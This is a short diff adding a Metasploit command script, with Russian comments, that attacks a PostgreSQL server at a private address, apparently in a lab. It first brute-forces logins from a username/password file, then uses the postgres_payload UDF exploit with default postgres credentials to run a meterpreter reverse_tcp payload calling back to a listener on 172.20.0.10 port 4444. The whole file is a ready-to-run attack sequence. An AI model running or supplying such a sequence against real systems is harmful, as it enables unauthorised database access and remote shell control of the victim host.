@@ -1,0 +1,18 @@
+# Подбор пароля
+use auxiliary/scanner/postgres/postgres_login
+set RHOSTS 172.20.0.108
+set USERPASS_FILE ./userpass.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+run
+
+# Выполнение кода через UDF
+use exploit/linux/postgres/postgres_payload
+set RHOSTS 172.20.0.108
+set USERNAME postgres
+set PASSWORD postgres
+set TARGET 1
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 172.20.0.10
+set LPORT 4444
+exploit
